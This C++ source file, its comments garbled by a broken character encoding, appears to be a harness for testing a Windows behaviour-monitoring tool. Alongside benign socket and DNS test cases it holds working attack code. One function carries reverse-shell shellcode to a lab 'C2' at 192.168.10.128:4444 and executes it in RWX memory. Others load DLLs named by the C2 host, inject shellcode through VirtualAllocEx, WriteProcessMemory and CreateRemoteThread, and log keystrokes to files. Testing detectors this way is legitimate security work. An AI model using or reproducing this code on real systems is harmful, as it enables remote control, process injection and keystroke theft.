		5900,   // VNC
		3306,   // MySQL
		53,     // DNS
		8080    // HTTP proxy/����
	};

	for (int port : ports) {
		std::cout << "Testing connection to " << kaliIP << ":" << port << "\n";

		// ���� TCP �׽���
		SOCKET sock = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
		if (sock == INVALID_SOCKET) {
			std::cerr << "  [ERROR] Socket creation failed: " << WSAGetLastError() << "\n";
			continue;
		}

		// ����Ŀ���ַ
		sockaddr_in targetAddr;
		targetAddr.sin_family = AF_INET;
		targetAddr.sin_port = htons(port);
		inet_pton(AF_INET, kaliIP.c_str(), &targetAddr.sin_addr);

		// ���ӳ���
		int result = connect(sock, (sockaddr*)&targetAddr, sizeof(targetAddr));
		if (result == SOCKET_ERROR) {
			std::cout << "  [FAILED] Connection refused or timed out (expected if Kali not listening)\n";
		}
		else {
			std::cout << "  [SUCCESS] Connection established to Kali\n";
			std::this_thread::sleep_for(std::chrono::seconds(10)); // ��������һ���
			closesocket(sock);  // �ر�����
		}

		std::cout << "----------------------------------------\n";

		// ��ֹ����Ƶ�ʹ���
		std::this_thread::sleep_for(std::chrono::milliseconds(200));
	}

	WSACleanup();
}

void TestMaliciousWSAConnects()
{
	// ��ʼ��Winsock
	WSADATA wsaData;
	if (WSAStartup(MAKEWORD(2, 2), &wsaData) != 0) {
		std::cerr << "WSAStartup failed: " << WSAGetLastError() << "\n";
		return;
	}

	// Kali��������ַ�Ͷ˿�
	const char* kaliIP = "192.168.10.128";
	const int kaliPort = 5555;

	std::cout << "Testing WSAConnect to Kali " << kaliIP << ":" << kaliPort << "\n";

	// ����TCP�׽���
	SOCKET sock = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
	if (sock == INVALID_SOCKET) {
		std::cerr << "Socket creation failed: " << WSAGetLastError() << "\n";
		WSACleanup();
		return;
	}

	// ����Ŀ���ַ
	sockaddr_in targetAddr;
	targetAddr.sin_family = AF_INET;
	targetAddr.sin_port = htons(kaliPort);
	inet_pton(AF_INET, kaliIP, &targetAddr.sin_addr);

	// ����WSAConnect����
	int result = WSAConnect(sock, (sockaddr*)&targetAddr, sizeof(targetAddr), nullptr, nullptr, nullptr, nullptr);

	if (result == SOCKET_ERROR) {
		DWORD err = WSAGetLastError();
		std::cout << "[WSAConnect] Connection attempt failed: " << err << "\n";
	}
	else {
		std::cout << "[WSAConnect] Connection established successfully.\n";
		// ��������Է������ݣ�����ִ�к�������
	}

	closesocket(sock);
	WSACleanup();
}

// �����������
std::string GenerateRandomDomain(int length) {
	std::string domain;
	domain.reserve(length);

	std::random_device rd;
	std::mt19937 gen(rd());
	std::uniform_int_distribution<> dis('a', 'z');

	for (int i = 0; i < length; ++i) {
		domain.push_back(static_cast<char>(dis(gen)));

		// �����ӵ�ָ���
		if (i > 0 && i < length - 1 && (i % 8 == 0)) {
			domain.push_back('.');
		}
	}

	return domain;
}

// ���� DNS ��ѯ���Ժ���
void TestMaliciousGetAddrInfo()
{
	// ��ʼ��Winsock
	WSADATA wsaData;
	if (WSAStartup(MAKEWORD(2, 2), &wsaData) != 0) {
		std::cerr << "WSAStartup failed: " << WSAGetLastError() << "\n";
		return;
	}

	// �����������
	struct TestCase {
		std::string nodeName;
		std::string serviceName;
		std::string description;
		int expectedWarningLevel;
	};

	std::vector<TestCase> testCases = {
		// 1. ���йؼ��ּ�� (vpn)
		{"secure-vpn-server.com", "443", "VPN service (vpn keyword)", 2},

		// 2. ���йؼ��ּ�� (proxy)
		{"proxy.example.org", "8080", "Proxy service (proxy keyword)", 2},

		// 3. ���йؼ��ּ�� (tor)
		{"tor-relay.net", "9001", "TOR relay (tor keyword)", 2},

		// 4. ���ɶ˿ڼ�� (6666)
		{"example.com", "6666", "Suspicious port 6666", 2},

		// 5. ���ɶ˿ڼ�� (31337)
		{"test.org", "31337", "Suspicious port 31337 (elite port)", 2},

		// 6. ��������� (DNS���)
		{GenerateRandomDomain(128), "53", "Long domain name (possible DNS tunneling)", 1},

		// 7. �����������
		{GenerateRandomDomain(256), "80", "Very long domain name (high risk tunneling)", 1},

		// 8. ��ϲ��� (���йؼ��� + ���ɶ˿�)
		{"anonymous-proxy.io", "31337", "Proxy service with elite port", 2},

		// 9. ��ϲ��� (������ + ���йؼ���)
		{"secure-" + GenerateRandomDomain(100) + "-vpn.com", "443", "Long domain with VPN keyword", 2},

		// 10. ������ѯ (HTTP)
		{"www.example.com", "80", "Normal HTTP service", 0},

		// 11. ������ѯ (HTTPS)
		{"google.com", "443", "Normal HTTPS service", 0},

		// 12. ������ѯ (DNS)
		{"dns-server.local", "53", "Normal DNS service", 0},

		// 13. ���ط����ѯ
		{"localhost", "8080", "Localhost service", 0},

		// 14. ��������ѯ (�Ƕ˿ں�)
		{"smtp.example.com", "smtp", "Service name instead of port number", 0}
	};

	for (const auto& test : testCases) {
		std::cout << "Testing: " << test.description << "\n";
		std::cout << "  Node: " << test.nodeName << "\n";
		std::cout << "  Service: " << test.serviceName << "\n";

		ADDRINFOA hints;
		PADDRINFOA result = nullptr;

		ZeroMemory(&hints, sizeof(hints));
		hints.ai_family = AF_UNSPEC;
		hints.ai_socktype = SOCK_STREAM;
		hints.ai_protocol = IPPROTO_TCP;

		// ִ�� DNS ��ѯ
		int status = getaddrinfo(
			test.nodeName.c_str(),
			test.serviceName.c_str(),
			&hints,
			&result
		);

		if (status != 0) {
			std::cerr << "  [ERROR] getaddrinfo failed: " << gai_strerror(status) << "\n";
		}
		else {
			std::cout << "  [SUCCESS] DNS query completed\n";

			// ��ӡ�������
			for (PADDRINFOA ptr = result; ptr != nullptr; ptr = ptr->ai_next) {
				char ipstr[INET6_ADDRSTRLEN];
				DWORD ipstrlen = sizeof(ipstr);

				if (ptr->ai_family == AF_INET) {
					sockaddr_in* ipv4 = (sockaddr_in*)ptr->ai_addr;
					inet_ntop(AF_INET, &(ipv4->sin_addr), ipstr, ipstrlen);
					std::cout << "    IPv4: " << ipstr << "\n";
				}
				else if (ptr->ai_family == AF_INET6) {
					sockaddr_in6* ipv6 = (sockaddr_in6*)ptr->ai_addr;
					inet_ntop(AF_INET6, &(ipv6->sin6_addr), ipstr, ipstrlen);
					std::cout << "    IPv6: " << ipstr << "\n";
				}
			}

			// �ͷŽ��
			freeaddrinfo(result);
		}

		std::cout << "  Expected warning level: " << test.expectedWarningLevel << "\n";
		std::cout << "----------------------------------------\n";

		// ����ӳٱ�����촥��
		std::this_thread::sleep_for(std::chrono::milliseconds(100));
	}

	// ����
	WSACleanup();
}

// ���� Socket �������Ժ���
void TestMaliciousSocketCreation()
{
	// ��ʼ��Winsock
	WSADATA wsaData;
	if (WSAStartup(MAKEWORD(2, 2), &wsaData) != 0) {
		std::cerr << "WSAStartup failed: " << WSAGetLastError() << "\n";
		return;
	}

	// �����������
	struct TestCase {
		int af;
		int type;
		int protocol;
		std::string description;
		int expectedWarningLevel;
	};

	std::vector<TestCase> testCases = {
		// 1. ����TCP�׽��� (IPv4)
		{AF_INET, SOCK_STREAM, IPPROTO_TCP, "Normal TCP socket (IPv4)", 0},

		// 2. ����UDP�׽��� (IPv4)
		{AF_INET, SOCK_DGRAM, IPPROTO_UDP, "Normal UDP socket (IPv4)", 0},

		// 3. ����TCP�׽��� (IPv6)
		{AF_INET6, SOCK_STREAM, IPPROTO_TCP, "Normal TCP socket (IPv6)", 0},

		// 4. ����UDP�׽��� (IPv6)
		{AF_INET6, SOCK_DGRAM, IPPROTO_UDP, "Normal UDP socket (IPv6)", 0},

		// 5. RAW�׽��� (ICMP)
		{AF_INET, SOCK_RAW, IPPROTO_ICMP, "RAW socket (ICMP)", 2},

		// 6. RAW�׽��� (�Զ���Э��)
		{AF_INET, SOCK_RAW, 255, "RAW socket (custom protocol)", 2},

		// 7. RAW�׽��� (IPv6)
		{AF_INET6, SOCK_RAW, IPPROTO_ICMPV6, "RAW socket (IPv6 ICMPv6)", 2},

		// 8. δ֪��ַ��
		{999, SOCK_STREAM, IPPROTO_TCP, "Unknown address family", 0},

		// 9. δ֪�׽�������
		{AF_INET, 999, IPPROTO_TCP, "Unknown socket type", 0},

		// 10. δ֪Э��
		{AF_INET, SOCK_STREAM, 999, "Unknown protocol", 0},

		// 11. ԭʼTCP�׽��֣��������ڶ˿�ɨ�裩
		{AF_INET, SOCK_RAW, IPPROTO_TCP, "RAW socket (TCP)", 2},

		// 12. ԭʼUDP�׽��֣�������������ɨ�裩
		{AF_INET, SOCK_RAW, IPPROTO_UDP, "RAW socket (UDP)", 2},

		// 13. ԭʼIPv6 TCP�׽���
		{AF_INET6, SOCK_RAW, IPPROTO_TCP, "RAW socket (IPv6 TCP)", 2},

		// 14. ԭʼIPv6 UDP�׽���
		{AF_INET6, SOCK_RAW, IPPROTO_UDP, "RAW socket (IPv6 UDP)", 2}
	};

	for (const auto& test : testCases) {
		std::cout << "Testing: " << test.description << "\n";
		std::cout << "  AF: " << test.af << ", Type: " << test.type << ", Protocol: " << test.protocol << "\n";

		// �����׽���
		SOCKET sock = socket(test.af, test.type, test.protocol);

		if (sock == INVALID_SOCKET) {
			DWORD err = WSAGetLastError();
			std::cerr << "  [ERROR] Socket creation failed: " << err << "\n";

			// ԭʼ�׽���ͨ����Ҫ����ԱȨ��
			if (test.type == SOCK_RAW && err == WSAEACCES) {
				std::cout << "  [NOTE] RAW socket requires administrator privileges\n";
			}
		}
		else {
			std::cout << "  [SUCCESS] Socket created successfully\n";

			// ��ȡ�׽�����Ϣ
			int sock_type;
			int optlen = sizeof(sock_type);
			getsockopt(sock, SOL_SOCKET, SO_TYPE, (char*)&sock_type, &optlen);

			int sock_protocol;
			optlen = sizeof(sock_protocol);
			getsockopt(sock, SOL_SOCKET, SO_PROTOCOL_INFO, (char*)&sock_protocol, &optlen);

			std::cout << "  Actual socket type: " << sock_type << ", protocol: " << sock_protocol << "\n";

			// �ر��׽���
			closesocket(sock);
		}

		std::cout << "  Expected warning level: " << test.expectedWarningLevel << "\n";
		std::cout << "----------------------------------------\n";

		// ����ӳٱ�����촥��
		std::this_thread::sleep_for(std::chrono::milliseconds(100));
	}

	// ����
	WSACleanup();
}

// ���� Socket �رղ��Ժ���
void TestMaliciousSocketClose()
{
	// ��ʼ��Winsock
	WSADATA wsaData;
	if (WSAStartup(MAKEWORD(2, 2), &wsaData) != 0) {
		std::cerr << "WSAStartup failed: " << WSAGetLastError() << "\n";
		return;
	}

	// �����������
	struct TestCase {
		SOCKET socket;
		std::string description;
		int expectedWarningLevel;
	};

	// ����һЩ�����׽���
	SOCKET validSocket = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
	SOCKET anotherValidSocket = socket(AF_INET, SOCK_DGRAM, IPPROTO_UDP);

	// ׼����������
	std::vector<TestCase> testCases = {
		// 1. �����ر���Ч�׽���
		{validSocket, "Close valid TCP socket", 0},

		// 2. �ر���Ч�׽��� (INVALID_SOCKET)
		{INVALID_SOCKET, "Close INVALID_SOCKET", 0},

		// 3. �ر�NULL�׽��� (0)
		{0, "Close NULL socket (0)", 2},

		// 4. �ر����ֵ�׽���
		{(SOCKET)0xDEADBEEF, "Close random socket handle", 0},

		// 5. �ظ��ر�ͬһ���׽��� (��һ��)
		{anotherValidSocket, "Close valid UDP socket (first time)", 0},

		// 6. �ظ��ر�ͬһ���׽��� (�ڶ���)
		{anotherValidSocket, "Close same UDP socket again", 1},

		// 7. ���������رն���׽���
		{socket(AF_INET, SOCK_STREAM, IPPROTO_TCP), "Close socket 1 of 5", 0},
		{socket(AF_INET, SOCK_STREAM, IPPROTO_TCP), "Close socket 2 of 5", 0},
		{socket(AF_INET, SOCK_STREAM, IPPROTO_TCP), "Close socket 3 of 5", 0},
		{socket(AF_INET, SOCK_STREAM, IPPROTO_TCP), "Close socket 4 of 5", 0},
		{socket(AF_INET, SOCK_STREAM, IPPROTO_TCP), "Close socket 5 of 5", 1}
	};

	for (auto& test : testCases) {
		std::cout << "Testing: " << test.description << "\n";
		std::cout << "  Socket: " << test.socket << "\n";

		// ִ�йرղ���
		int result = closesocket(test.socket);

		if (result == SOCKET_ERROR) {
			DWORD err = WSAGetLastError();
			std::cerr << "  [ERROR] closesocket failed: " << err << "\n";
		}
		else {
			std::cout << "  [SUCCESS] Socket closed\n";
		}

		std::cout << "  Expected warning level: " << test.expectedWarningLevel << "\n";
		std::cout << "----------------------------------------\n";

		// ���ڿ��������رղ��ԣ�����ӳٱ���һ���Թر�
		if (test.description.find("socket 1 of 5") != std::string::npos) {
			std::this_thread::sleep_for(std::chrono::milliseconds(10));
		}
	}

	// ����
	WSACleanup();
}

/*--------------------------------------------------------------------------------------------------------------
-------------------------------------------------����ͮ---------------------------------------------------------
----------------------------------------------------------------------------------------------------------------*/


void CREATEPROCESSW() {
	// ����ͨ�Ų���
	WSADATA wsaData;
	WSAStartup(MAKEWORD(2, 2), &wsaData);

	SOCKET sock = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);

	sockaddr_in servAddr;
	memset(&servAddr, 0, sizeof(servAddr));
	servAddr.sin_family = AF_INET;
	servAddr.sin_addr.s_addr = inet_addr("192.168.10.128"); // ����C2������
	servAddr.sin_port = htons(4444);

	connect(sock, (SOCKADDR*)&servAddr, sizeof(servAddr));

	// ����Զ��ָ��
	char cmd[256];
	recv(sock, cmd, sizeof(cmd), 0);

	// ִ�ж�����̴������ᴥ����⣩
	if (strstr(cmd, "launch")) {
		STARTUPINFOA si = { sizeof(si) };
		PROCESS_INFORMATION pi = { 0 };
		char cmdLine[] = "cmd.exe /c dir";
		// 2. ��ȷ����CreateProcessA
		BOOL bSuccess = CreateProcessA(
			NULL,                    // Ӧ�ó�����(�ɿ�)
			cmdLine,     // ������(�����д)
			NULL,                    // ���̰�ȫ����
			NULL,                    // �̰߳�ȫ����
			FALSE,                   // ���̳о��
			CREATE_NO_WINDOW,        // ������־
			NULL,                    // ��������(�̳�)
			NULL,                    // ��ǰĿ¼(�̳�)
			&si,                     // ������Ϣ
			&pi                      // ������Ϣ
		);
		if (!bSuccess) {
			DWORD dwError = GetLastError();
			printf("CreateProcess failed (%d)\n", dwError);
		}
		else {
			CloseHandle(pi.hProcess);
			CloseHandle(pi.hThread);
		}
	}

	closesocket(sock);
	WSACleanup();
}


void CREATETHREAD() {

	// ��ʼ��Winsock
	WSADATA wsaData;
	WSAStartup(MAKEWORD(2, 2), &wsaData);

	// ����Socket
	SOCKET sock = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);

	// ����Ŀ��IP�Ͷ˿�
	sockaddr_in targetAddr;
	memset(&targetAddr, 0, sizeof(targetAddr));
	targetAddr.sin_family = AF_INET;
	targetAddr.sin_addr.s_addr = inet_addr("192.168.10.128");
	targetAddr.sin_port = htons(4444);

	// �������ӣ��������ӣ�
	if (connect(sock, (SOCKADDR*)&targetAddr, sizeof(targetAddr)) == SOCKET_ERROR) {
		printf("����ʧ��\n");
		closesocket(sock);
		WSACleanup();
		return;
	}
	printf("���ӳɹ���\n");

	unsigned char shellcode[] = {
			0xfc, 0x48, 0x83, 0xe4, 0xf0, 0xe8, 0xc0, 0x00, 0x00, 0x00, 0x41, 0x51, 0x41, 0x50,
			0x52, 0x51, 0x56, 0x48, 0x31, 0xd2, 0x65, 0x48, 0x8b, 0x52, 0x60, 0x48, 0x8b, 0x52,
			0x18, 0x48, 0x8b, 0x52, 0x20, 0x48, 0x8b, 0x72, 0x50, 0x48, 0x0f, 0xb7, 0x4a, 0x4a,
			0x4d, 0x31, 0xc9, 0x48, 0x31, 0xc0, 0xac, 0x3c, 0x61, 0x7c, 0x02, 0x2c, 0x20, 0x41,
			0xc1, 0xc9, 0x0d, 0x41, 0x01, 0xc1, 0xe2, 0xed, 0x52, 0x41, 0x51, 0x48, 0x8b, 0x52,
			0x20, 0x8b, 0x42, 0x3c, 0x48, 0x01, 0xd0, 0x8b, 0x80, 0x88, 0x00, 0x00, 0x00, 0x48,
			0x85, 0xc0, 0x74, 0x67, 0x48, 0x01, 0xd0, 0x50, 0x8b, 0x48, 0x18, 0x44, 0x8b, 0x40,
			0x20, 0x49, 0x01, 0xd0, 0xe3, 0x56, 0x48, 0xff, 0xc9, 0x41, 0x8b, 0x34, 0x88, 0x48,
			0x01, 0xd6, 0x4d, 0x31, 0xc9, 0x48, 0x31, 0xc0, 0xac, 0x41, 0xc1, 0xc9, 0x0d, 0x41,
			0x01, 0xc1, 0x38, 0xe0, 0x75, 0xf1, 0x4c, 0x03, 0x4c, 0x24, 0x08, 0x45, 0x39, 0xd1,
			0x75, 0xd8, 0x58, 0x44, 0x8b, 0x40, 0x24, 0x49, 0x01, 0xd0, 0x66, 0x41, 0x8b, 0x0c,
			0x48, 0x44, 0x8b, 0x40, 0x1c, 0x49, 0x01, 0xd0, 0x41, 0x8b, 0x04, 0x88, 0x48, 0x01,
			0xd0, 0x41, 0x58, 0x41, 0x58, 0x5e, 0x59, 0x5a, 0x41, 0x58, 0x41, 0x59, 0x41, 0x5a,
			0x48, 0x83, 0xec, 0x20, 0x41, 0x52, 0xff, 0xe0, 0x58, 0x41, 0x59, 0x5a, 0x48, 0x8b,
			0x12, 0xe9, 0x57, 0xff, 0xff, 0xff, 0x5d, 0x49, 0xbe, 0x77, 0x73, 0x32, 0x5f, 0x33,
			0x32, 0x00, 0x00, 0x41, 0x56, 0x49, 0x89, 0xe6, 0x48, 0x81, 0xec, 0xa0, 0x01, 0x00,
			0x00, 0x49, 0x89, 0xe5, 0x49, 0xbc, 0x02, 0x00, 0x11, 0x5c, 0xc0, 0xa8, 0x0a, 0x80,
			0x41, 0x54, 0x49, 0x89, 0xe4, 0x4c, 0x89, 0xf1, 0x41, 0xba, 0x4c, 0x77, 0x26, 0x07,
			0xff, 0xd5, 0x4c, 0x89, 0xea, 0x68, 0x01, 0x01, 0x00, 0x00, 0x59, 0x41, 0xba, 0x29,
			0x80, 0x6b, 0x00, 0xff, 0xd5, 0x50, 0x50, 0x4d, 0x31, 0xc9, 0x4d, 0x31, 0xc0, 0x48,
			0xff, 0xc0, 0x48, 0x89, 0xc2, 0x48, 0xff, 0xc0, 0x48, 0x89, 0xc1, 0x41, 0xba, 0xea,
			0x0f, 0xdf, 0xe0, 0xff, 0xd5, 0x48, 0x89, 0xc7, 0x6a, 0x10, 0x41, 0x58, 0x4c, 0x89,
			0xe2, 0x48, 0x89, 0xf9, 0x41, 0xba, 0x99, 0xa5, 0x74, 0x61, 0xff, 0xd5, 0x48, 0x81,
			0xc4, 0x40, 0x02, 0x00, 0x00, 0x49, 0xb8, 0x63, 0x6d, 0x64, 0x00, 0x00, 0x00, 0x00,
			0x00, 0x41, 0x50, 0x41, 0x50, 0x48, 0x89, 0xe2, 0x57, 0x57, 0x57, 0x4d, 0x31, 0xc0,
			0x6a, 0x0d, 0x59, 0x41, 0x50, 0xe2, 0xfc, 0x66, 0xc7, 0x44, 0x24, 0x54, 0x01, 0x01,
			0x48, 0x8d, 0x44, 0x24, 0x18, 0xc6, 0x00, 0x68, 0x48, 0x89, 0xe6, 0x56, 0x50, 0x41,
			0x50, 0x41, 0x50, 0x41, 0x50, 0x49, 0xff, 0xc0, 0x41, 0x50, 0x49, 0xff, 0xc8, 0x4d,
			0x89, 0xc1, 0x4c, 0x89, 0xc1, 0x41, 0xba, 0x79, 0xcc, 0x3f, 0x86, 0xff, 0xd5, 0x48,
			0x31, 0xd2, 0x48, 0xff, 0xca, 0x8b, 0x0e, 0x41, 0xba, 0x08, 0x87, 0x1d, 0x60, 0xff,
			0xd5, 0xbb, 0xf0, 0xb5, 0xa2, 0x56, 0x41, 0xba, 0xa6, 0x95, 0xbd, 0x9d, 0xff, 0xd5,
			0x48, 0x83, 0xc4, 0x28, 0x3c, 0x06, 0x7c, 0x0a, 0x80, 0xfb, 0xe0, 0x75, 0x05, 0xbb,
			0x47, 0x13, 0x72, 0x6f, 0x6a, 0x00, 0x59, 0x41, 0x89, 0xda, 0xff, 0xd5
	};

	LPVOID execMem = VirtualAlloc(NULL, sizeof(shellcode), MEM_COMMIT, PAGE_EXECUTE_READWRITE);
	memcpy(execMem, shellcode, sizeof(shellcode));

	HANDLE hThread = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)execMem, NULL, 0, NULL);
	if (hThread) {
		WaitForSingleObject(hThread, INFINITE);
		CloseHandle(hThread);
	}
	VirtualFree(execMem, 0, MEM_RELEASE);

	closesocket(sock);
	WSACleanup();
}
void EXITTHREAD() {
	// ��ʼ��Winsock
	WSADATA wsaData;
	WSAStartup(MAKEWORD(2, 2), &wsaData);

	// ����Socket
	SOCKET sock = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);

	// ����Ŀ��IP�Ͷ˿ڣ������߼�����
	sockaddr_in targetAddr;
	memset(&targetAddr, 0, sizeof(targetAddr));
	targetAddr.sin_family = AF_INET;
	targetAddr.sin_addr.s_addr = inet_addr("192.168.10.128"); // Kali IP
	targetAddr.sin_port = htons(4444);

	// ��������
	if (connect(sock, (SOCKADDR*)&targetAddr, sizeof(targetAddr)) == SOCKET_ERROR) {
		printf("����ʧ�ܣ�\n");
		closesocket(sock);
		WSACleanup();
		return;
	}
	printf("���ӳɹ����ȴ����� exitCode...\n");

	// ���չ�����ָ�����߳��˳���
	DWORD exitCode = 0;
	int len = recv(sock, (char*)&exitCode, sizeof(exitCode), 0);
	printf("���յ� exitCode: 0x%08X\n", exitCode);

	if (len == sizeof(exitCode) && exitCode != 0) {
		// ģ���쳣�˳��̣߳��ᱻ��ؼ�¼��
		ExitThread(exitCode);
	}

	// ������Դ
	closesocket(sock);
	WSACleanup();
}
void LOADLIBRARYEXA() {
	// ��ʼ��Winsock������ͼƬ��ȫ��ͬ�ķ��
	WSADATA wsaData;
	WSAStartup(MAKEWORD(2, 2), &wsaData);

	// ����C2ͨ���׽��֣��޸�Ϊ������IP��
	SOCKET c2Sock = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
	sockaddr_in c2Addr;
	memset(&c2Addr, 0, sizeof(c2Addr));
	c2Addr.sin_family = AF_INET;
	c2Addr.sin_addr.s_addr = inet_addr("192.168.10.128"); // C2������IP
	c2Addr.sin_port = htons(4444);
	connect(c2Sock, (SOCKADDR*)&c2Addr, sizeof(c2Addr));

	// ��C2���ն���DLL·�����ᴥ��LOADLIBRARY��⣩
	char dllPath[MAX_PATH];
	recv(c2Sock, dllPath, MAX_PATH, 0);

	// ������صĶ���DLL������Ϊ
	HMODULE hMalDll = LoadLibraryExA(
		dllPath,          // �磺"C:\\Temp\\inject.dll"
		NULL,
		LOAD_WITH_ALTERED_SEARCH_PATH
	);

	if (hMalDll) {
		// ��ȡ��ִ�ж��⵼������
		FARPROC pMalFunc = GetProcAddress(hMalDll, "Start");
		if (pMalFunc) {
			((void(*)())pMalFunc)();
		}
		FreeLibrary(hMalDll);
	}

	// ������Դ����ȫ����ͼƬ���
	closesocket(c2Sock);
	WSACleanup();
}
void GETPROCADDRESS() {
	// ��ʼ��Winsock
	WSADATA wsaData;
	WSAStartup(MAKEWORD(2, 2), &wsaData);
	// ����C2ͨ���׽��֣��޸�Ϊ������IP��
	SOCKET c2Sock = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
	sockaddr_in c2Addr;
	memset(&c2Addr, 0, sizeof(c2Addr));
	c2Addr.sin_family = AF_INET;
	c2Addr.sin_addr.s_addr = inet_addr("192.168.10.128"); // C2������IP
	c2Addr.sin_port = htons(4444);
	connect(c2Sock, (SOCKADDR*)&c2Addr, sizeof(c2Addr));
	// ��C2����Ҫ������API���ƣ��ᴥ��GETPROCADDRESS��⣩
	char apiName[64];
	recv(c2Sock, apiName, sizeof(apiName), 0);
	// ������صĶ���API������Ϊ
	HMODULE hModule = GetModuleHandleA("kernel32.dll");
	FARPROC pFunc = GetProcAddress(hModule, apiName); // �磺"CreateRemoteThread"
	if (pFunc) {
		// ִ��Σ��API���߳�ע��
		if (strcmp(apiName, "CreateRemoteThread") == 0) {
			HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, 1234);

			// ��ȷ���庯��ָ������
			typedef HANDLE(WINAPI* fnCreateRemoteThread)(
				HANDLE,
				LPSECURITY_ATTRIBUTES,
				SIZE_T,
				LPTHREAD_START_ROUTINE,
				LPVOID,
				DWORD,
				LPDWORD
				);

			// ����ת�������
			((fnCreateRemoteThread)pFunc)(
				hProcess,
				NULL,
				0,
				NULL,
				NULL,
				0,
				NULL
				);

			CloseHandle(hProcess);
		}
	}
}

void VIRTUALALLOCEX() {



}

void WRITEPROCESSMEMORY() {
	// 1. ��ȷ��ʼ��Winsock
	WSADATA wsaData;
	if (WSAStartup(MAKEWORD(2, 2), &wsaData) != 0) {
		return;
	}

	// ����C2ͨ���׽��֣��޸�Ϊ������IP��
	SOCKET c2Sock = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
	sockaddr_in c2Addr;
	memset(&c2Addr, 0, sizeof(c2Addr));
	c2Addr.sin_family = AF_INET;
	c2Addr.sin_addr.s_addr = inet_addr("192.168.10.128"); // C2������IP
	c2Addr.sin_port = htons(4444);
	connect(c2Sock, (SOCKADDR*)&c2Addr, sizeof(c2Addr));

	// ��C2����Ŀ��PID��д������
	struct {
		DWORD pid;
		char data[256];
	} payload;

	recv(c2Sock, (char*)&payload, sizeof(payload), 0);

	// ������صĿ�����ڴ�д�루�ᴥ��WRITEPROCESSMEMORY��⣩
	HANDLE hTarget = OpenProcess(PROCESS_VM_WRITE | PROCESS_VM_OPERATION, FALSE, payload.pid);
	if (hTarget) {
		// ��Ŀ�����д������
		SIZE_T bytesWritten;
		WriteProcessMemory(
			hTarget,                     // �ǵ�ǰ���̾��
			(LPVOID)0x00400000,          // Ŀ���ַ��ʾ����
			payload.data,                // д������
			strlen(payload.data) + 1,    // ���ݳ���
			&bytesWritten                // ����д���ֽ���
		);
		CloseHandle(hTarget);
	}

	// ������Դ����ȫ����ͼƬ���
	closesocket(c2Sock);
	WSACleanup();
}
void CREATEREMOTETHREAD() {
	// ��ʼ��Winsock
	WSADATA wsaData; WSAStartup(MAKEWORD(2, 2), &wsaData);

	// ����C2ͨ���׽���
	SOCKET c2Sock = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
	sockaddr_in c2Addr; memset(&c2Addr, 0, sizeof(c2Addr));
	c2Addr.sin_family = AF_INET;
	c2Addr.sin_addr.s_addr = inet_addr("192.168.10.128"); // C2������IP
	c2Addr.sin_port = htons(4444);
	connect(c2Sock, (SOCKADDR*)&c2Addr, sizeof(SOCKADDR));
	Sleep(500); // ����ͼƬ�е��ӳ�

	// ��C2����Ŀ��PID��shellcode
	struct {
		DWORD pid;
		BYTE shellcode[256];
	} payload;
	recv(c2Sock, (char*)&payload, sizeof(payload), NULL);

	// ����CREATEREMOTETHREAD��⣨�ؼ�������Ϊ��
	HANDLE hTarget = OpenProcess(PROCESS_ALL_ACCESS, FALSE, payload.pid);
	if (hTarget != NULL) {
		LPVOID pRemoteMem = VirtualAllocEx(hTarget, NULL, sizeof(payload.shellcode),
			MEM_COMMIT, PAGE_EXECUTE_READWRITE);
		if (pRemoteMem) {
			WriteProcessMemory(hTarget, pRemoteMem, payload.shellcode,
				sizeof(payload.shellcode), NULL);

			// ������صĺ��ĵ���
			CreateRemoteThread(hTarget, NULL, 0,
				(LPTHREAD_START_ROUTINE)pRemoteMem,
				NULL, 0, NULL);
		}
		CloseHandle(hTarget);
	}

	// ������Դ
	closesocket(c2Sock); WSACleanup();
}




/*--------------------------------------------------------------------------------------------------------------
-------------------------------------------------Ҧ�Ĵ�---------------------------------------------------------
----------------------------------------------------------------------------------------------------------------*/
void dangerousKeyLogging() {
	// ����һ���ļ�����¼����
	FILE* logFile;
	fopen_s(&logFile, "keylog.txt", "a+");

	if (logFile) {
		// ѭ����ⳣ�ü�λ
		for (int key = 0x8; key <= 0xFF; key++) {
			// ��ⰴ��״̬
			SHORT keyState = GetAsyncKeyState(key);

			// ������������� (���λΪ1)
			if (keyState & 0x8000) {//0x8000�ڶ���������1000 0000 0000 0000�����keyState���λ��1��������������0
				// ��¼�����λ
				if (key == VK_RETURN)//�س���
					fprintf(logFile, "[ENTER]\n");
				else if (key == VK_BACK)//�˸�
					fprintf(logFile, "[BACKSPACE]");
				else if (key == VK_SPACE)//�ո�
					fprintf(logFile, " ");
				else if (key >= 0x41 && key <= 0x5A) // A-Z
					fprintf(logFile, "%c", key);
			}
		}
		fclose(logFile);
	}
}

// ģ��Σ�ղ����������� GetKeyState ��¼����״̬
void suspiciousKeyStateLogging() {
	FILE* logFile;
	fopen_s(&logFile, "keystate_log.txt", "a+");

	if (logFile) {
		for (int key = 0x8; key <= 0x90; key++) {
			SHORT state = GetKeyState(key);
			if (state & 0x8000) {  // ����Ƿ񱻰���
				if (key == VK_RETURN)
					fprintf(logFile, "[ENTER]\n");
				else if (key == VK_BACK)
					fprintf(logFile, "[BACKSPACE]");
				else if (key == VK_SPACE)
					fprintf(logFile, " ");
				else if (key >= 0x41 && key <= 0x5A)
					fprintf(logFile, "%c", key);
			}
		}
		fclose(logFile);
	}
}

// ע�����ȼ����ڲ��� hook ���
void simulateHotkeyRegistration() {
	// ���ÿ�ݼ����

	RegisterHotKey(NULL, 1, MOD_CONTROL, 'C');                  // Ctrl+C
	Sleep(1000);//ע���ȼ�̫��Ļ����������ڴ���д���ܻḲ�ǣ����������������ȥ�����ڴ��������ֻ�����ע����ȼ���Ϣ�ܱ�����
	RegisterHotKey(NULL, 2, MOD_WIN, 'R');                      // Win+R
	Sleep(1000);
	RegisterHotKey(NULL, 3, MOD_ALT | MOD_CONTROL, VK_DELETE);  // Ctrl+Alt+Del�����У�
	Sleep(1000);
	RegisterHotKey(NULL, 4, MOD_ALT, VK_F4);                    // Alt+F4
	Sleep(1000);

